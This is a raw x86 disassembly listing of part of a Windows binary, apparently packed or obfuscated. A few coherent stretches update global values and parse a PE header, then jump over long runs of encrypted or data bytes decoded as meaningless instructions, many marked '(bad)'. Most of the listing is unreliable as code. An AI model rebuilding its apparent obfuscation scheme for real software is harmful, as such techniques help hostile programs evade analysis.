  40ff5e:	ficom  DWORD PTR [ecx+0x5f]
  40ff61:	sub    bh,al
  40ff63:	iret   
  40ff64:	and    BYTE PTR ds:0x694bf3de,dl
  40ff6a:	pop    edi
  40ff6c:	inc    ebp
  40ff6d:	cld    
  40ff6e:	xor    DWORD PTR [ebp+0x458bf89c],eax
  40ff74:	or     BYTE PTR [edx+0x3405c700],cl
  40ff7a:	loope  0x40ffbe
  40ff7c:	add    BYTE PTR [edx],bh
  40ff7e:	cmp    al,BYTE PTR [eax]
  40ff80:	add    BYTE PTR [edi+esi*1],al
  40ff83:	xor    DWORD PTR ds:0x42e6f7,0x42fd7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fcd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fd76
  40ffaa:	and    edx,DWORD PTR ds:0x42e6fb
  40ffb0:	mov    DWORD PTR ds:0x42fd76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e703,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	push   ds
  40ffdd:	cmp    esi,ecx
  40ffdf:	pop    es
  40ffe0:	xor    eax,0xa37070bd
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x41005d
  40ffe9:	les    ecx,FWORD PTR [ebp-0x69]
  40ffec:	or     eax,DWORD PTR [eax]
  40ffee:	adc    ah,BYTE PTR [edx]
  40fff0:	xchg   DWORD PTR [eax+0x277e5d34],ebx
  40fff6:	push   ss
  40fff7:	mov    al,0x34
  40fff9:	pop    ds
  40fffa:	ja     0x410055
  40fffc:	mov    esi,0x6befac7
  410001:	add    ebx,DWORD PTR [edx-0x7cb8d4b5]
  410007:	push   ss
  410008:	jae    0x40ffc4
  41000a:	in     eax,0x5
  41000c:	sbb    edi,DWORD PTR [ecx]
  41000e:	jmp    0xa46790e5
  410013:	push   ebp
  410014:	inc    ebx
  410015:	(bad)  
  410016:	out    0xe1,eax
  410018:	jmp    0x410064
  41001a:	sub    bh,BYTE PTR [eax]
  41001c:	pop    ecx
  41001d:	pop    eax
  41001e:	push   ecx
  41001f:	es dec ecx
  410021:	pop    ecx
  410022:	adc    edx,ebp
  410024:	sbb    eax,0x1cb89be
  410029:	inc    esi
  41002a:	push   ecx
  41002b:	jbe    0x41001e
  41002d:	fild   QWORD PTR [esi+0x19]
  410030:	pop    esi
  410031:	gs pop esi
  410033:	pop    ebx
  410034:	mov    DWORD PTR [ecx],ebp
  410036:	mov    esp,0xc6b1848a
  41003b:	push   bp
  41003d:	and    edx,esi
  41003f:	xor    BYTE PTR [esi+0x62],ah
  410042:	dec    ebp
  410043:	mov    ecx,DWORD PTR [ebx-0x3a7ab39e]
  410049:	ins    DWORD PTR es:[edi],dx
  41004a:	enter  0x27bc,0x70
  41004e:	lea    edx,[ebp+0x77]
  410051:	stos   BYTE PTR es:[edi],al
  410052:	cld    
  410053:	sub    eax,0x50ce9fa9
  410058:	test   dh,dh
  41005a:	js     0x41008d
  41005c:	call   0x197ad3dc
  410061:	aam    0xf2
  410063:	xchg   ebx,eax
  410064:	jmp    0x8302:0xb805c2fb
  41006b:	pop    esp
  41006c:	retf   
  41006d:	add    esi,DWORD PTR [esi]
  41006f:	dec    esp
  410070:	bound  esi,QWORD PTR [ecx-0xa]
  410073:	outs   dx,BYTE PTR ds:[esi]
  410074:	sar    BYTE PTR [eax],1
  410076:	xor    BYTE PTR [edx],cl
  410078:	pop    edi
  41007a:	jns    0x4100d7
  41007c:	xor    BYTE PTR [ebx],ch
  41007e:	pushf  
  41007f:	mov    esp,DWORD PTR [edx]
  410081:	test   eax,0x6395b31a
  410086:	and    eax,0x683bde9
  41008b:	jb     0x41001f
  41008d:	aad    0xf6
  41008f:	mov    edx,0x31e89053
  410094:	call   0x8645:0x70d31528
  41009b:	xor    al,0x7d
  41009d:	sbb    DWORD PTR [edx+0x199a0ae3],ebp
  4100a3:	mov    ebx,ebp
  4100a5:	cmc    
  4100a6:	mov    edx,0x8fb6de1c
  4100ab:	jecxz  0x4100f9
  4100ad:	xchg   DWORD PTR [esi],eax
  4100af:	scas   eax,DWORD PTR es:[edi]
  4100b0:	xchg   DWORD PTR [ebx-0x4e636e7d],eax
  4100b6:	mov    cl,0x8c
  4100b8:	in     al,dx
  4100b9:	jl     0x4100ae
  4100bb:	fucomp st(4)
  4100bd:	into   
  4100be:	icebp  
  4100bf:	cmp    eax,0xd2079b2b
  4100c4:	cmp    dl,dl
  4100c6:	je     0x41005d
  4100c8:	jb     0x410098
  4100ca:	mov    esi,fs
  4100cc:	push   ss
  4100cd:	pop    ds
  4100ce:	xchg   ebp,eax
  4100cf:	cmp    eax,0xddd906f9
  4100d4:	stos   BYTE PTR es:[edi],al
  4100d5:	or     edx,ebx
  4100d7:	xchg   edi,eax
  4100d8:	mov    ?,edi
  4100da:	or     esp,DWORD PTR [edi+0x241c3bfd]
  4100e0:	in     eax,dx
  4100e1:	jae    0x4100af
  4100e3:	das    
  4100e4:	push   0xffffff81
  4100e6:	sub    ch,BYTE PTR [esi+0x54]
  4100e9:	xor    edi,edx
  4100eb:	xor    al,0xe4
  4100ed:	cmp    dl,BYTE PTR [ecx]
  4100ef:	repz xchg ecx,eax
  4100f1:	jae    0x41015d
  4100f3:	cmp    al,0xf4
  4100f5:	push   ebx
  4100f6:	add    al,0xab
  4100f8:	xchg   BYTE PTR [ebp-0x77],al
  4100fb:	xor    esi,DWORD PTR [eax]
  4100fd:	pop    ss
  4100fe:	jbe    0x41017c
  410100:	int    0x87
  410102:	sub    esi,DWORD PTR [eax]
  410104:	repnz mov esp,0x9f2915e9
  41010a:	pop    edi
  41010b:	xor    eax,0x23fc17cc
  410110:	test   DWORD PTR [eax+esi*2],0x1255c199
  410117:	jg     0x4100e0
  410119:	mov    ebx,0xb738b587
  41011e:	add    DWORD PTR [esi+ecx*1+0x70],edx
  410122:	pusha  
  410123:	xchg   ebx,eax
  410124:	cmp    DWORD PTR [eax-0x755d38fa],ecx
  41012a:	mov    esi,0x53960790
  41012f:	test   al,0x1f
  410131:	pop    es
  410132:	xor    ebx,ebp
  410134:	pusha  
  410135:	call   0x596b519f
  41013a:	lahf   
  41013b:	jo     0x4100f4
  41013d:	mov    ebx,0x58386434
  410142:	dec    edx
  410143:	pop    ecx
  410144:	or     eax,0x5c6958cb
  410149:	test   eax,0xd3bde907
  41014e:	mov    edi,DWORD PTR [ecx+ebx*1]
  410151:	and    BYTE PTR [eax+0x4e86f744],bh
  410157:	jnp    0x41014a
  410159:	or     eax,0x78d85e4
  41015e:	inc    edx
  41015f:	add    BYTE PTR [edx+0x11],bl
  410162:	sub    al,0xf
  410164:	not    al
  410166:	jl     0x4100eb
  410168:	mov    ss,edx
  41016a:	sbb    BYTE PTR [ebp+0x1a],0xa4
  41016e:	cdq    
  41016f:	data16 jl 0x4101e0
  410172:	xlat   BYTE PTR ds:[ebx]
  410173:	ds (bad) 
  410175:	pop    edi
  410176:	adc    DWORD PTR [esi+0x2e8004be],esi
  41017c:	xor    ah,cl
  41017e:	mov    al,0x17
  410180:	adc    eax,DWORD PTR [eax+edi*2+0x7957eb77]
  410187:	(bad)  
  410188:	mov    ebp,0x94f30574
  41018d:	jge    0x4101c8
  41018f:	arpl   WORD PTR [ebx],dx
  410191:	mov    al,0x2c
  410193:	mov    ?,WORD PTR [edi+0x4c7d6713]
  410199:	iret   
  41019a:	into   
  41019b:	cmp    eax,0xa818936f
  4101a0:	xchg   BYTE PTR [edi+0x3a],cl
  4101a3:	scas   al,BYTE PTR es:[edi]
  4101a4:	sbb    dl,dh
  4101a6:	bound  eax,QWORD PTR [ebx+0x4c]
  4101a9:	cmp    eax,DWORD PTR [esi]
  4101ab:	jae    0x410172
  4101ad:	mov    al,0xde
  4101af:	xor    al,0x75
  4101b1:	hlt    
  4101b2:	sub    esi,DWORD PTR [ecx+ecx*8-0x38]
  4101b6:	imul   edi,DWORD PTR [ebx+0x36],0x2a
  4101ba:	push   ds
  4101bb:	mov    ebp,0x603115fb
  4101c0:	xor    al,0xfb
  4101c2:	jp     0x410199
  4101c4:	jne    0x41023d
  4101c6:	adc    BYTE PTR [ebx+0x1563ba78],bl
  4101cc:	call   0x3c858242
  4101d1:	icebp  
  4101d2:	or     DWORD PTR [ebp-0xe],esp
  4101d5:	xchg   esp,eax
  4101d6:	jecxz  0x41019f
  4101d8:	push   ss
  4101d9:	in     al,0x15
  4101db:	or     DWORD PTR [ebx-0x64adad0],ebx
  4101e1:	test   BYTE PTR [edi-0x37],0x28
  4101e5:	sub    bh,BYTE PTR [eax]
  4101e7:	out    0xbe,eax
  4101e9:	pop    esi
  4101ea:	ss dec edi
  4101ec:	scas   eax,DWORD PTR es:[edi]
  4101ed:	jge    0x410209
  4101ef:	imul   ebp,DWORD PTR [ebx-0x9],0x5380f597
  4101f6:	push   es
  4101f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101f8:	dec    ecx
  4101f9:	add    eax,0x9d3245fa
  4101fe:	jns    0x410216
  410200:	mov    edi,0x8434361c
  410205:	dec    esp
  410206:	add    edi,edi
  410208:	cmp    al,0x90
  41020a:	cmp    al,bh
  41020c:	ret    0x7804
  41020f:	lods   eax,DWORD PTR ds:[esi]
  410210:	outs   dx,DWORD PTR ds:[esi]
  410211:	adc    ch,0xb0
  410214:	pusha  
  410215:	mov    ss,WORD PTR [edi+0x545c2c3d]
  41021b:	pop    edi
  41021c:	pop    es
  41021d:	xor    DWORD PTR [edi+0x64],ebx
  410220:	mov    ch,0x5
  410222:	mov    ebx,0xbc1735c1
  410227:	cmp    ebx,DWORD PTR [ecx+esi*4]
  41022a:	jmp    0x410241
  41022c:	in     al,0x27
  41022e:	fst    QWORD PTR [ecx-0x65]
  410231:	shl    DWORD PTR ds:0x1e4c4a51,0x8e
  410238:	mov    cl,0x8
  41023a:	add    al,0x38
  41023c:	mov    esi,0x47896a1d
  410241:	rcl    DWORD PTR [edx-0x3550df01],0x7b
  410248:	mov    dl,bh
  41024a:	adc    BYTE PTR [ebp-0x737a1892],bh
  410250:	sbb    edx,DWORD PTR [edi-0x25]
  410253:	adc    DWORD PTR [esi-0x2a],0xe0c72d16
  41025a:	es pop ebp
  41025c:	mov    al,0x66
  41025e:	shl    ch,1
  410260:	aad    0x31
  410262:	jmp    0xdd70:0xc700d2ab
  410269:	cmove  esi,DWORD PTR [ecx]
  41026c:	cdq    
  41026d:	shl    DWORD PTR [edi+0x3d04d831],1
  410273:	data16 cmp al,ah
  410276:	call   0x8bf6:0x2ab4725e
  41027d:	jg     0x4102f0
  41027f:	cmc    
  410280:	add    esp,eax
  410282:	sub    DWORD PTR [ebx+ebp*2+0x1b78684b],eax
  410289:	or     al,0x24
  41028b:	jb     0x410298
  41028d:	and    BYTE PTR [ecx],bl
  41028f:	mov    bl,0x43
  410291:	dec    edi
  410292:	inc    eax
  410293:	neg    BYTE PTR [eax+0x3c]
  410296:	out    0x7,al
  410298:	xor    eax,0xb086385f
  41029d:	mov    esp,0x317d22e7
  4102a2:	dec    edx
  4102a3:	in     eax,0x73
  4102a5:	pop    ebx
  4102a6:	pop    DWORD PTR [ebx+0x52832b18]
  4102ac:	dec    esi
  4102ad:	mov    ebp,0xf98b7bff
  4102b2:	pop    ds
  4102b3:	pop    edi
  4102b4:	ja     0x4102d5
  4102b6:	je     0x410288
  4102b8:	push   ecx
  4102b9:	jp     0x410335
  4102bb:	(bad)  
  4102bc:	jg     0x410243
  4102be:	das    
  4102bf:	imul   ebx,DWORD PTR [ecx+0x2d],0xabdf6a84
  4102c6:	inc    esp
  4102c7:	popa   
  4102c8:	jno    0x4102fa
  4102ca:	dec    esp
  4102cb:	fwait
  4102cc:	lock pop ecx
  4102ce:	or     DWORD PTR [ecx-0x2d],ebx
  4102d1:	test   al,0x30
  4102d3:	cmc    
  4102d4:	imul   ah
  4102d6:	jne    0x4102d3
  4102d8:	hlt    
  4102d9:	mov    edx,0xac65fb9b
  4102de:	jmp    0xf704:0x732faeca
  4102e5:	sub    ebp,edx
  4102e7:	enter  0x6420,0x99
  4102eb:	push   esi
  4102ec:	xchg   edi,eax
  4102ed:	lea    ebx,[ebp+edx*8+0x51a7a4b]
  4102f4:	out    0x78,eax
  4102f6:	adc    DWORD PTR [edi],ecx
  4102f8:	pop    ecx
  4102f9:	or     DWORD PTR [edx+0x4b],esp
  4102fc:	mov    ds:0x1989a0b6,eax
  410301:	xor    al,0xb5
  410303:	add    ebp,DWORD PTR [edi+0x63]
  410306:	adc    ebx,ebx
  410308:	in     eax,dx
  410309:	push   edx
  41030a:	pop    edi
  41030b:	push   ebx
  41030c:	je     0x41038d
  41030e:	dec    edx
  41030f:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410311:	xchg   esi,eax
  410312:	(bad)  
  410313:	jno    0x410359
  410315:	lea    esi,[edi-0x77]
  410318:	adc    eax,0xb863316f
  41031d:	and    BYTE PTR [eax+0x69],0xed
  410321:	enter  0xa8a0,0x8c
  410325:	stos   DWORD PTR es:[edi],eax
  410326:	add    bh,bh
  410328:	jmp    0x41030e
  41032a:	out    0x58,al
  41032c:	shl    DWORD PTR [edi+0x7e3cfa62],cl
  410332:	dec    edx
  410333:	hlt    
  410334:	les    ecx,FWORD PTR [ebx]
  410336:	add    ecx,DWORD PTR fs:[eax-0x47]
  41033a:	pop    eax
  41033b:	adc    eax,0x1d2c5bf9
  410340:	test   DWORD PTR [edi],edi
  410342:	mov    edi,0xb2e77216
  410347:	cwde   
  410348:	jg     0x4103b9
  41034a:	jns    0x4102e9
  41034c:	call   0x697284c6
  410351:	or     edx,edi
  410353:	sub    eax,0xecadf34
  410358:	push   ds
  410359:	(bad)  
  41035b:	loopne 0x4103b7
  41035d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41035e:	or     DWORD PTR [ebx],esi
  410360:	arpl   WORD PTR [ecx-0x1d],si
  410363:	mov    edx,0xf39895ce
  410368:	dec    esp
  410369:	ds retf 0xcd3
  41036d:	daa    
  41036e:	repz mov dl,0xe5
  410371:	test   al,0x6d
  410373:	xchg   esi,eax
  410374:	mov    edi,0x986635a8
  410379:	xchg   BYTE PTR [ebx+0x1dfbedf6],bh
  41037f:	dec    ecx
  410380:	sbb    al,BYTE PTR [eax-0x6ae872b7]
  410386:	mov    esp,DWORD PTR [ebx]
  410388:	jmp    0xeb8c1891
  41038d:	ins    DWORD PTR es:[edi],dx
  41038e:	push   ss
  41038f:	xlat   BYTE PTR ds:[ebx]
  410390:	mov    esp,edx
  410392:	pop    edi
  410393:	inc    ebx
  410394:	lock mov DWORD PTR [ebp+0x8],ecx
  410398:	add    eax,0x2082
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fd05
  4103a6:	add    ecx,DWORD PTR ds:0x42fd09
  4103ac:	mov    DWORD PTR ds:0x42fd05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e11c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0x9ac3:0x7919bab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	mov    al,ds:0xadf8618c
  4103df:	sub    al,bh
  4103e1:	xor    eax,0x43a5c31
  4103e6:	cmp    BYTE PTR [ebx],bh
  4103e8:	leave  
  4103e9:	arpl   WORD PTR [ebp+0x4da76796],bp
  4103ef:	push   ds
  4103f0:	jbe    0x410382
  4103f2:	std    
  4103f3:	pause  
  4103f5:	mov    eax,edx
  4103f7:	pop    ebp
  4103f8:	pop    ebp
  4103f9:	pop    ecx
  4103fa:	outs   dx,BYTE PTR ds:[esi]
  4103fb:	sti    
  4103fc:	dec    ebp
  4103fd:	aas    
  4103fe:	ins    DWORD PTR es:[edi],dx
  4103ff:	adc    DWORD PTR [ebx+0x1f],edi
  410402:	xor    edi,DWORD PTR [eax-0x1b40ef2f]
  410408:	pop    ebp
  410409:	call   0x55354cac
  41040e:	jmp    0x4103ac
  410410:	mov    ds:0x38fcbc64,eax
  410415:	mov    eax,ds:0xb3f05059
  41041a:	push   0x68
  41041c:	imul   edx,DWORD PTR [eax+0x60],0xc30b8b41
  410423:	xor    DWORD PTR [edx-0x10],esp
  410426:	mov    dh,BYTE PTR [ebp+0x69]
  410429:	loop   0x4103d1
  41042b:	rcl    dl,0x6a
  41042e:	dec    DWORD PTR ds:0x41768e93
  410434:	xor    al,0x58
  410436:	out    0xc7,al
  410438:	jnp    0x41041b
  41043a:	sbb    al,0x48
  41043c:	adc    esi,esp
  41043e:	or     ecx,esi
  410440:	fwait
  410441:	dec    ebx
  410442:	(bad)  
  410443:	sbb    eax,0x64ccc3c
  410448:	push   0x14643457
  41044d:	dec    ecx
  41044e:	rol    BYTE PTR fs:[ecx+edx*2+0x290a11dd],1
  410456:	jno    0x410402
  410458:	push   es
  410459:	arpl   WORD PTR [esp+esi*4-0x3def7ed5],bp
  410460:	lods   eax,DWORD PTR ds:[esi]
  410461:	inc    ebp
  410462:	in     al,dx
  410463:	cwde   
  410464:	xlat   BYTE PTR ds:[ebx]
  410465:	push   ss
  410466:	fcomi  st,st(7)
  410468:	inc    edi
  410469:	jp     0x410425
  41046b:	sbb    esp,DWORD PTR [eax-0x3]
  41046e:	mov    cl,0x1d
  410470:	stos   DWORD PTR es:[edi],eax
  410471:	ret    0xdfa3
  410474:	sub    DWORD PTR [edx+edx*8],ebx
  410477:	push   es
  410478:	push   ebp
  410479:	pop    edi
  41047a:	fsub   DWORD PTR [edx+0x31]
  41047d:	and    eax,0x730f6f18
  410482:	rol    DWORD PTR ds:0x127118e6,0xd
  410489:	test   cl,bl
  41048b:	xchg   DWORD PTR [eax],eax
  41048d:	das    
  41048e:	iret   
  41048f:	push   esi
  410490:	xor    ebp,DWORD PTR [ecx]
  410492:	and    DWORD PTR [esi+0x67fc33cd],0x40
  410499:	and    dh,ah
  41049b:	call   DWORD PTR [eax]
  41049d:	pusha  
  41049e:	fwait
  41049f:	add    DWORD PTR [edx],ebp
  4104a1:	mov    ebx,0x54e6582c
  4104a6:	(bad)  
  4104a7:	nop
  4104a8:	xchg   bl,bh
  4104aa:	add    ecx,ebp
  4104ac:	push   cs
  4104ad:	ret    
  4104ae:	das    
  4104af:	inc    sp
  4104b1:	mov    ecx,0x358709b1
  4104b6:	mov    WORD PTR ds:0x904bfeec,es
  4104bc:	in     al,0xee
  4104be:	jge    0x41052e
  4104c0:	test   eax,0xa2edb266
  4104c5:	mov    esi,0x79d3fbf7
  4104ca:	mov    eax,ds:0xaf260a84
  4104cf:	inc    esp
  4104d0:	dec    ecx
  4104d2:	jmp    0x41054a
  4104d4:	push   edi
  4104d5:	test   edi,esi
  4104d7:	std    
  4104d8:	inc    edi
  4104d9:	cmp    eax,0x984e32f8
  4104de:	push   ebx
  4104df:	pop    ecx
  4104e0:	sbb    bl,dl
  4104e2:	stc    
  4104e3:	jl     0x410485
  4104e5:	mov    edx,0x69f05054
  4104ea:	mov    dl,0xaf
  4104ec:	loopne 0x410514
  4104ee:	int    0xb5
  4104f0:	mov    dh,0xe1
  4104f2:	rcl    ebx,1
  4104f4:	ret    0x6114
  4104f7:	push   cs
  4104f8:	mov    cl,0x6f
  4104fa:	aad    0xf3
  4104fc:	imul   eax,DWORD PTR [edi-0x90ca6fa],0x7e
  410503:	xchg   BYTE PTR [eax],bh
  410505:	xchg   ebp,eax
  410506:	mul    BYTE PTR [ecx]
  410508:	mov    ds:0x70e72f89,al
  41050d:	mov    bh,BYTE PTR [edx-0x441c607f]
  410513:	popf   
  410514:	inc    edx
  410515:	lods   al,BYTE PTR ds:[esi]
  410516:	mov    dh,0x1d
  410518:	out    dx,eax
  410519:	adc    al,0xa2
  41051b:	les    esp,FWORD PTR [eax-0x37]
  41051e:	ss call 0xf05d195
  410524:	aas    
  410525:	stc    
  410526:	adc    esp,DWORD PTR [edi+0x62dcddc5]
  41052c:	xchg   ecx,eax
  41052d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41052e:	mov    ds:0x89c898e,eax
  410533:	sahf   
  410534:	outs   dx,DWORD PTR ds:[esi]
  410535:	jo     0x41050b
  410537:	dec    ecx
  410538:	rcl    BYTE PTR [esi+ebx*8],0x7
  41053c:	mov    bh,0x97
  41053e:	push   esi
  41053f:	xlat   BYTE PTR ds:[ebx]
  410540:	or     bl,BYTE PTR [ebx-0x6e305a87]
  410546:	adc    BYTE PTR [edi-0x765c10e1],dl
  41054c:	push   eax
  41054d:	pop    ss
  41054e:	mov    WORD PTR [eax],ds
  410550:	add    DWORD PTR [ecx+0x1aff0dfd],eax
  410556:	xor    DWORD PTR [edi],edx
  410558:	dec    esp
  410559:	push   0xbeb0ef2a
  41055e:	outs   dx,BYTE PTR ds:[esi]
  41055f:	pop    ds
  410560:	pop    ebx
  410561:	pop    ss
  410562:	sub    al,0x75
  410564:	push   0x4d
  410566:	hlt    
  410567:	mov    ecx,0xef1df884
  41056c:	cdq    
  41056d:	pop    esp
  41056e:	mov    BYTE PTR [ebx-0x7],dh
  410571:	aad    0x9a
  410573:	sti    
  410574:	jg     0x410500
  410576:	sbb    DWORD PTR [edx+0x2d],0xffffffd3
  41057a:	mov    edx,DWORD PTR [esi]
  41057c:	nop
  41057d:	sbb    ah,BYTE PTR [edi+0x4dd14689]
  410583:	fisttp DWORD PTR [ebx+0x258335a6]
  410589:	repnz fistp QWORD PTR [edi-0x7f]
  41058d:	jne    0x410594
  41058f:	and    eax,0x8e60753b
  410594:	sub    cl,BYTE PTR ds:0x682ec0d1
  41059a:	and    BYTE PTR [ecx],dh
  41059c:	sub    al,0xe8
  41059e:	pop    edi
  41059f:	jge    0x4105ab
  4105a1:	jne    0x41060c
  4105a3:	and    DWORD PTR [eax],esi
  4105a5:	adc    esp,DWORD PTR [eax+0x8]
  4105a8:	mov    ?,WORD PTR [esi]
  4105aa:	jl     0x410625
  4105ac:	mov    ecx,0x8c26c5da
  4105b1:	arpl   WORD PTR [ebx+0x3dcd8a1c],si
  4105b7:	cmp    al,0xc9
  4105b9:	cdq    
  4105ba:	xor    eax,DWORD PTR [ebx+0x2bd23832]
  4105c0:	out    dx,al
  4105c1:	je     0x4105fa
  4105c3:	mov    ds:0x5218eed6,eax
  4105c8:	cwde   
  4105c9:	ss or  al,0xbd
  4105cc:	mov    BYTE PTR [edx+edi*2],cl
  4105cf:	jae    0x4105a1
  4105d1:	push   ebx
  4105d2:	xor    ah,BYTE PTR [ebx+0x41e58a10]
  4105d8:	inc    ecx
  4105d9:	pop    esp
  4105da:	stos   BYTE PTR es:[edi],al
  4105db:	push   0x4dc44951
  4105e0:	mov    ds:0x3d1c8540,al
  4105e5:	pop    ss
  4105e6:	mov    dl,0x7b
  4105e8:	inc    edi
  4105e9:	icebp  
  4105ea:	rcr    DWORD PTR [edi+0x7486c29d],0x57
  4105f1:	adc    dh,dh
  4105f3:	jne    0x4105b0
  4105f5:	ins    BYTE PTR es:[edi],dx
  4105f6:	retf   
  4105f7:	adc    eax,0xc6b0ac7d
  4105fc:	add    edi,DWORD PTR ds:[ebx]
  4105ff:	int    0xde
  410601:	fisubr WORD PTR [ebp-0x48]
  410604:	add    eax,0x13b5fe92
  410609:	out    dx,al
  41060a:	shl    ah,cl
  41060c:	mov    al,0xd5
  41060e:	push   edx
  41060f:	data16 mov bh,ah
  410612:	and    bh,BYTE PTR [ebx-0x6c26741c]
  410618:	push   edx
  410619:	push   eax
  41061a:	imul   ecx,DWORD PTR gs:[eax+0x2b86d779],0x57
  410622:	call   0x26e302ef
  410627:	xacquire xchg DWORD PTR [ebp+0x5097e300],edx
  41062e:	xchg   ebx,eax
  41062f:	and    dl,BYTE PTR [ebx]
  410631:	pop    ecx
  410632:	and    cl,BYTE PTR [ecx-0x3cf4b122]
  410638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410639:	ret    0xd559
  41063c:	jge    0x410661
  41063e:	mov    BYTE PTR [edx+0x7],al
  410641:	mov    edx,0xbfdd73a3
  410646:	cli    
  410647:	push   edx
  410648:	xor    DWORD PTR [ebx],esi
  41064a:	cmp    eax,0x2724e4ea
  41064f:	stos   DWORD PTR es:[edi],eax
  410650:	mov    bl,0xd0
  410652:	push   esp
  410653:	daa    
  410654:	add    DWORD PTR [ecx+0x256da0f0],ecx
  41065a:	push   ebp
  41065b:	push   ebx
  41065c:	xchg   ebx,eax
  41065d:	pop    ecx
  41065e:	pop    ebx
  41065f:	pop    eax
  410660:	gs in  al,dx
  410662:	mov    edi,0x325d407b
  410667:	(bad)  
  410668:	clc    
  410669:	mov    esp,0x7028fdc6
  41066e:	repz cld 
  410670:	push   edx
  410671:	mov    esi,0xdeaf6251
  410676:	lea    eax,[ebp+ebp*2-0x83d284e]
  41067d:	call   0xd858:0xedd3ba27
  410684:	mov    ch,0xa3
  410686:	lods   al,BYTE PTR ds:[esi]
  410687:	dec    esp
  410688:	and    eax,0x70c62eee
  41068d:	(bad)  
  41068e:	std    
  41068f:	js     0x4106c6
  410691:	cmc    
  410692:	scas   al,BYTE PTR es:[edi]
  410693:	fs loope 0x4106e1
  410696:	lahf   
  410697:	cld    
  410698:	push   0x75871e8e
  41069d:	aad    0x48
  41069f:	addr16 dec eax
  4106a1:	nop
  4106a2:	ficomp DWORD PTR [edx]
  4106a4:	scas   al,BYTE PTR es:[edi]
  4106a5:	mov    esi,0xd01c91d1
  4106aa:	in     al,0x33
  4106ac:	dec    ebp
  4106ad:	xor    dh,BYTE PTR [esi+0x2a]
  4106b0:	and    bl,BYTE PTR [eax-0x3a]
  4106b3:	call   0xcbef:0xa9c07545
  4106ba:	fdivr  QWORD PTR [ecx+ebx*8-0x586485f9]
  4106c1:	mov    edx,0x7e0cccbd
  4106c6:	cmp    al,0x1f
  4106c8:	lods   al,BYTE PTR ds:[esi]
  4106c9:	call   0xf63b:0x820fa2e
  4106d0:	mov    edx,0x6037c5f6
  4106d5:	mov    al,0x9d
  4106d7:	xor    dl,dh
  4106d9:	outs   dx,DWORD PTR ds:[esi]
  4106da:	in     eax,dx
  4106db:	ss (bad) 
  4106dd:	xor    ebp,DWORD PTR fs:[esi+0x103a754d]
  4106e4:	xchg   ebp,eax
  4106e5:	std    
  4106e6:	pop    ds
  4106e7:	dec    esp
  4106e8:	imul   si,bp,0xee4a
  4106ed:	xchg   esi,eax
  4106ee:	rcl    DWORD PTR [ecx+0x7f98a40c],cl
  4106f4:	aam    0x70
  4106f6:	jl     0x4106ee
  4106f8:	test   BYTE PTR [ebx+eax*4-0x2db0ea3f],0x90
  410700:	xchg   esp,eax
  410701:	pushw  es
  410703:	sbb    DWORD PTR [eax+0x46d89a94],ebx
  410709:	or     eax,0xd99fb90c
  41070e:	jg     0x4106e1
  410710:	pop    eax
  410711:	aas    
  410712:	xchg   esp,eax
  410713:	mov    fs,WORD PTR [ebx]
  410715:	bound  ecx,QWORD PTR [edi]
  410717:	xchg   ebp,eax
  410718:	test   DWORD PTR [ecx+edx*4-0x14d9a235],ebx
  41071f:	add    DWORD PTR [edx+0x27],0xbef7212d
  410726:	push   esp
  410727:	pop    esp
  410728:	jle    0x410792
  41072a:	mov    DWORD PTR [esi+ecx*2],esp
  41072d:	sahf   
  41072e:	sub    eax,0x3fe6fd74
  410733:	jmp    0x8343:0x93fb9110
  41073a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41073b:	shl    BYTE PTR [ecx+0x2470da17],cl
  410741:	dec    esp
  410742:	sub    DWORD PTR [edx-0x4a1a402c],ebx
  410748:	popa   
  410749:	fidivr WORD PTR ds:0x54b54022
  41074f:	je     0x4107cd
  410751:	jbe    0x4107af
  410753:	retf   0x7b53
  410756:	mov    al,ds:0x721bb60f
  41075b:	daa    
  41075c:	popf   
  41075d:	add    al,0xdc
  41075f:	arpl   WORD PTR [edi+0x773b77b8],cx
  410765:	cs das 
  410767:	dec    edx
  410768:	sbb    eax,0x58dcec57
  41076d:	lods   eax,DWORD PTR ds:[esi]
  41076e:	data16 into 
  410770:	shr    ch,cl
  410772:	pusha  
  410773:	xchg   edi,eax
  410774:	jae    0x410781
  410776:	mov    edi,0x378c8fc5
  41077b:	or     al,0x6d
  41077d:	xchg   edx,eax
  41077e:	sub    edx,DWORD PTR [eax-0x72464f2b]
  410784:	inc    esp
  410785:	stos   BYTE PTR es:[edi],al
  410786:	xor    BYTE PTR [ebx-0x267ef78b],cl
  41078c:	es das 
  41078e:	add    BYTE PTR [eax],al
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	dec    ecx
  4107a9:	stos   BYTE PTR es:[edi],al
  4107aa:	imul   esp,edi,0xffffff8b
  4107ad:	inc    esi
  4107ae:	jo     0x410820
  4107b0:	mov    ds:0x7170707d,eax
